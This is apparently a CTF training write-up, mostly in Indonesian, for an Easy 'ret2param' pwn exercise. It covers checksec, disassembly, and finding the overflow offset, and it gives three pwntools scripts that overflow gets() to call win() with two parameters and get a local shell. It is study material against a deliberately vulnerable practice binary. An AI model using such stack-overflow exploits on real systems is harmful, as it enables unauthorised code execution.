---
slug: "pwn-ret2param"
title: "ret2param"
competition: "Exercise"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-18"
updated: "2026-08-24"
summary: "Latihan buat persiapan seleksi LKS, isinya ret2param."
tags: ["PWN","ROP","HANDS-ON","EASY","X86","RET2PARAM"]
status: "published"
flag: "SHELL"
attachments: []
source: "https://claritys.web.id/writeups/pwn-ret2param"
---

# ret2param

> Latihan buat persiapan seleksi LKS, isinya ret2param.

Diawal, kita sudah diberi hint bahwa challenge ini itu **ret2param**. Langsung saja kita checksec.

```bash

~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main* 3m 29s
❯ checksec something_32                                                          󰥔 13:57:15

[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param/something_32'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Luckily, its not stripped, lets check the function.

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ pwndbg something_32                                                            󰥔 13:45:10
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.00ms using Python engine 3.13
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from something_32...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.cachyos.org>
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in something_32)
gef➤  info fun
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x080490b0  printf@plt
0x080490c0  gets@plt
0x080490d0  puts@plt
0x080490e0  system@plt
0x080490f0  exit@plt
0x08049100  __libc_start_main@plt
0x08049110  setvbuf@plt
0x08049120  _start
0x08049160  _dl_relocate_static_pie
0x08049170  __x86.get_pc_thunk.bx
0x08049180  deregister_tm_clones
0x080491c0  register_tm_clones
0x08049200  __do_global_dtors_aux
0x08049230  frame_dummy
0x08049236  init
0x08049280  win
0x08049301  sport
0x08049386  main
0x080493ab  __x86.get_pc_thunk.ax
0x080493b0  __libc_csu_init
0x08049420  __libc_csu_fini
0x08049425  __x86.get_pc_thunk.bp
0x0804942c  _fini
```

Because this is a ret2param, so i have to check all the function that defined here. As usual, the main calling the other function.

```
gef➤  disas sport
Dump of assembler code for function sport:
   0x08049301 <+0>:     endbr32
   0x08049305 <+4>:     push   ebp
   0x08049306 <+5>:     mov    ebp,esp
   0x08049308 <+7>:     push   ebx
   0x08049309 <+8>:     sub    esp,0x44
   0x0804930c <+11>:    call   0x8049170 <__x86.get_pc_thunk.bx>
   0x08049311 <+16>:    add    ebx,0x2cef
   0x08049317 <+22>:    sub    esp,0xc
   0x0804931a <+25>:    lea    eax,[ebx-0x1f9c]
   0x08049320 <+31>:    push   eax
   0x08049321 <+32>:    call   0x80490d0 <puts@plt>
   0x08049326 <+37>:    add    esp,0x10
   0x08049329 <+40>:    sub    esp,0xc
   0x0804932c <+43>:    lea    eax,[ebx-0x1f84]
   0x08049332 <+49>:    push   eax
   0x08049333 <+50>:    call   0x80490d0 <puts@plt>
   0x08049338 <+55>:    add    esp,0x10
   0x0804933b <+58>:    sub    esp,0xc
   0x0804933e <+61>:    lea    eax,[ebx-0x1f54]
   0x08049344 <+67>:    push   eax
   0x08049345 <+68>:    call   0x80490d0 <puts@plt>
   0x0804934a <+73>:    add    esp,0x10
   0x0804934d <+76>:    sub    esp,0xc
   0x08049350 <+79>:    lea    eax,[ebx-0x1f24]
   0x08049356 <+85>:    push   eax
   0x08049357 <+86>:    call   0x80490b0 <printf@plt>
   0x0804935c <+91>:    add    esp,0x10
   0x0804935f <+94>:    sub    esp,0xc
   0x08049362 <+97>:    lea    eax,[ebp-0x48]
   0x08049365 <+100>:   push   eax
   0x08049366 <+101>:   call   0x80490c0 <gets@plt>
   0x0804936b <+106>:   add    esp,0x10
   0x0804936e <+109>:   sub    esp,0xc
   0x08049371 <+112>:   lea    eax,[ebx-0x1ed0]
   0x08049377 <+118>:   push   eax
   0x08049378 <+119>:   call   0x80490d0 <puts@plt>
   0x0804937d <+124>:   add    esp,0x10
   0x08049380 <+127>:   nop
   0x08049381 <+128>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049384 <+131>:   leave
   0x08049385 <+132>:   ret
End of assembler dump.
gef➤  disas win
Dump of assembler code for function win:
   0x08049280 <+0>:     endbr32
   0x08049284 <+4>:     push   ebp
   0x08049285 <+5>:     mov    ebp,esp
   0x08049287 <+7>:     push   ebx
   0x08049288 <+8>:     sub    esp,0x4
   0x0804928b <+11>:    call   0x8049170 <__x86.get_pc_thunk.bx>
   0x08049290 <+16>:    add    ebx,0x2d70
   0x08049296 <+22>:    cmp    DWORD PTR [ebp+0x8],0xba5eba11
   0x0804929d <+29>:    jne    0x80492e0 <win+96>
   0x0804929f <+31>:    cmp    DWORD PTR [ebp+0xc],0xf007ba11
   0x080492a6 <+38>:    jne    0x80492e0 <win+96>
   0x080492a8 <+40>:    sub    esp,0xc
   0x080492ab <+43>:    lea    eax,[ebx-0x1ff8]
   0x080492b1 <+49>:    push   eax
   0x080492b2 <+50>:    call   0x80490d0 <puts@plt>
   0x080492b7 <+55>:    add    esp,0x10
   0x080492ba <+58>:    sub    esp,0xc
   0x080492bd <+61>:    lea    eax,[ebx-0x1fe6]
   0x080492c3 <+67>:    push   eax
   0x080492c4 <+68>:    call   0x80490d0 <puts@plt>
   0x080492c9 <+73>:    add    esp,0x10
   0x080492cc <+76>:    sub    esp,0xc
   0x080492cf <+79>:    lea    eax,[ebx-0x1fd8]
   0x080492d5 <+85>:    push   eax
   0x080492d6 <+86>:    call   0x80490e0 <system@plt>
   0x080492db <+91>:    add    esp,0x10
   0x080492de <+94>:    jmp    0x80492fc <win+124>
   0x080492e0 <+96>:    sub    esp,0xc
   0x080492e3 <+99>:    lea    eax,[ebx-0x1fd0]
   0x080492e9 <+105>:   push   eax
   0x080492ea <+106>:   call   0x80490d0 <puts@plt>
   0x080492ef <+111>:   add    esp,0x10
   0x080492f2 <+114>:   sub    esp,0xc
   0x080492f5 <+117>:   push   0x0
   0x080492f7 <+119>:   call   0x80490f0 <exit@plt>
   0x080492fc <+124>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x080492ff <+127>:   leave
   0x08049300 <+128>:   ret
End of assembler dump.
```

Okay, there’s gets. and 0x48 = 72, because its x86, we need 76 for reaching EIP. And now we verification for the offset for the EIP.

```
>>> 0x48
72
>>> 72 + 4
76
```

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x23
$ebx   : 0x61616172 ("raaa"?)
$ecx   : 0xf7f7b888  →  0x00000000
$edx   : 0xf7f7b888  →  0x00000000
$esp   : 0xffffd1e0  →  "uaaavaaawa"
$ebp   : 0x61616173 ("saaa"?)
$esi   : 0xf7f79e2c  →  0x00292d4c ("L-)"?)
$edi   : 0x080493b0  →  <__libc_csu_init+0000> endbr32
$eip   : 0x61616174 ("taaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1e0│+0x0000: "uaaavaaawa"         ← $esp
0xffffd1e4│+0x0004: "vaaawa"
0xffffd1e8│+0x0008: 0xf7006177 ("wa"?)
0xffffd1ec│+0x000c: 0xf7d09ac0  →   add esp, 0x10
0xffffd1f0│+0x0010: 0x00000001
0xffffd1f4│+0x0014: 0xffffd2b4  →  0xffffd4b9  →  "/home/claritys/ctf/pwncheatsheet/learnfromLKS/Bina[...]"
0xffffd1f8│+0x0018: 0xffffd2bc  →  0xffffd51a  →  "GHOSTTY_SHELL_FEATURES=path,sudo,title"
0xffffd1fc│+0x001c: 0x00000000
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616174
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "something_32", stopped 0x61616174 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  cyclic -l taaa
Finding cyclic pattern of 4 bytes: b'taaa' (hex: 0x74616161)
Found at offset 76
```

My own solver: (actually I’m using template from pwninit and then i modifed it a bit for my own environment)

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("something_32_patched")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.arch = "i386"

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    payload = flat(
        b'A' * 76,
        0x08049280,    #control EIP
        0,             #dummy for fake return address (aku gatau ini awalnya hehe)
        0xba5eba11,    #first param
        0xf007ba11     #second param
    )
    # good luck pwning :)
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
```

Nah, aku ini no AI tapi melihat referensi dari google. Itu fitur ya katanya di JCC wkwk.

![](/assets/uploads/8e515604-3bbe-48c2-ad68-2cb88c82cfe2-image-1.png)

Karena awalnya itu aku nggak ada fake return address, tapi akhirnya aku terpaksa googling writeupnya biar aku tau salahku di mana. Salahku ternyata di fake return address hehe. Yang tau alasannya pls kasih tau aku dong.

Reference:

```python
from pwn import *

p = process('./binary_x86')
elf = ELF('./binary_x86')

offset = 44  # Determined via cyclic pattern
win_addr = elf.sym['win']
arg1 = 0x12345678
arg2 = 0xdeadbeef

payload = b'A' * offset
payload += p32(win_addr)      # Control EIP to point to win()
payload += p32(0xdeadbeef)    # Fake return address for win()
payload += p32(arg1)          # First parameter [ebp + 0x8]
payload += p32(arg2)          # Second parameter [ebp + 0xc]

p.sendline(payload)
p.interactive()
```

Solver resmi dari latihan LKS nya adalah:

```python
from pwn import *

elf = context.binary = ELF('./something_32')
p = process()

win = p32(0x08049280)
param_1 = 0xba5eba11
param_2 = 0xf007ba11

offset = 76

payload = flat(
    'A' * offset, win, b'AAAA',
    param_1, param_2
)

p.sendline(payload)
p.interactive()⏎
```

we can keep it and use it as a reference in the future.

**Implement:**

```bash
~/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param main*
❯ python3 solve.py LOCAL                                                         󰥔 14:08:45
[*] '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param/something_32_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[x] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[┤] Starting local process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Ha[+] on/ROP/ret2param/something_32_patched': pid 123833
[*] Switching to interactive mode
Hana: Ayo olahragaa'
Luna: Tunggu kak, Luna mau nyiapin diri dahulu
Luna: Tapi Luna juga tidak tau olahrgara apa?
Hana: Udah tenang. Kan ada olahraga baseball dan football juga sih. Ayookk udh
>
Luna: Oke oke chill, Luna datang.

Hana: Ayo lunaaa
Luna: tungguu
$ ls
solve.py      something_32_patched  something_64     something.zip
something_32  something_32.py       something_64.py
$
[*] Interrupted
[*] Stopped process '/home/claritys/ctf/pwncheatsheet/learnfromLKS/Binary_Exploit/Hands-on/ROP/ret2param/something_32_patched' (pid 123833)
```
